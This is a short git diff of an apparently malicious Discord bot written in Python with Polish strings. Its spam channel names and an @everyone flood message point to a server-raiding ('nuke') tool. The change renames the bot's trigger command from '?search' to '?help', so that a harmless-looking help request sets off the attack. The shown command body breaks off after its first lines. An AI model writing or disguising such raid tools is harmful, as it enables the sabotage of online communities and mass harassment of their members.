@@ -11,7 +11,7 @@ SPAM_CHANNEL = ["MAMO JAK TO", "TATO ROZJEBALI SERWER", "NO NIE", "TO MOJE LINKI
 
 SPAM_MESSAGE = ["@everyone Ale kurwa EUPHORIA, PARADOKS, PODRÓŻ DO PRZYSZŁOŚCI!!!!"]
 
-# Trzeba wpisać "?search" aby włączyć!
+# Trzeba wpisać "?help" aby włączyć!
 # Trzeba wpisać "?stop" aby wyłączyć!
 bot = commands.Bot(command_prefix='?')
 
@@ -35,7 +35,7 @@ async def stop(ctx):
         
         
 @bot.command()
-async def search(ctx):
+async def help(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     try:
